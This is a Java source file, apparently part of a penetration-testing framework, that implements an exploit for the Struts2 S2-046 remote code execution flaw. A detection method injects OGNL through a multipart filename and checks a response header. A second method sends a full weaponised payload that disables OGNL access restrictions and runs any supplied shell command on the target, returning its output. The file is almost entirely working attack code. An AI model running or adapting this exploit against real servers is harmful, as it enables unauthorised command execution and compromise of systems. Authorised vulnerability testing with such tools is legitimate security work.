package com.orleven.tentacle.permeate.script;

import java.util.Map;

import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

import com.orleven.tentacle.core.IOC;
import com.orleven.tentacle.define.Message;
import com.orleven.tentacle.define.Permeate;
import com.orleven.tentacle.permeate.bean.ProveBean;
import com.orleven.tentacle.permeate.script.base.WebScriptBase;
import com.orleven.tentacle.util.WebUtil;

/**
 * Struts2 RCE 046
 * @author orleven
 * @date 2017年3月21日
 */
@Component
@Scope("prototype")
public class Struts2RCE046 extends WebScriptBase {
	
	public Struts2RCE046(){
		super();
	}
	
	@Override
	public void prove() {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String provePayload0 = "multipart/form-data; boundary=---------------------------735323031399963166993862150";
		String provePayload1 = "-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('ProveFlag','The Struts2-046 Remote Code Execution Is Exist!')}\"";
		String provePayload2 = "Content-Type: text/plain\r\n\r\nTest\r\n-----------------------------735323031399963166993862150--\r\n\r\n";
		String provePayload = provePayload1+(char)00+provePayload2;
		String proveFlag = "The Struts2-046 Remote Code Execution Is Exist!";
		String result = null;

		getHttpHeaders().put("Content-Type", provePayload0);
		Map<String, String> resHeaders = WebUtil.getResponseAllHeaders(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),provePayload.getBytes()));
		if (resHeaders==null) {
			result = Message.notAvailable;
			getVulnerBean().setIsVulner(Permeate.isNotVerified);
		}else if(resHeaders.get("ProveFlag")!=null&&resHeaders.get("ProveFlag").equals(proveFlag)){
			getVulnerBean().setIsVulner(Permeate.isVulner);

		}else{
			getVulnerBean().setIsVulner(Permeate.isNotVulner);
		}

		proveBean.setReceiveMessage(result);
		proveBean.setSendMessage("Content-Type: "+provePayload);
		getVulnerBean().getProveBean().add(proveBean);

	}
	
	@Override
	public void execCommand(String command) {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String execPayload0 = "multipart/form-data; boundary=---------------------------735323031399963166993862150";
		String execPayload1 = "-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo ----- The Struts2-046 Remote Code Execution -----  &&";
		String execPayload2 = "&& echo ----- The Struts2-046 Remote Code Execution ----- ').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
		String execPayload3 = "Content-Type: text/plain\r\n\r\nTest\r\n-----------------------------735323031399963166993862150--\r\n\r\n";
		String execPayload = execPayload1+command+execPayload2+(char)00+execPayload3;
		String result = "";
		String flag = "----- The Struts2-046 Remote Code Execution -----";
		
		getHttpHeaders().put("Content-Type", execPayload0);
		result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),execPayload.getBytes()));
		if(result!=null){
			result = result.substring(result.indexOf(flag));
		}
		proveBean.setReceiveMessage(result);
		proveBean.setSendMessage(command);
		getVulnerBean().getProveBean().add(proveBean);

	}
	

}
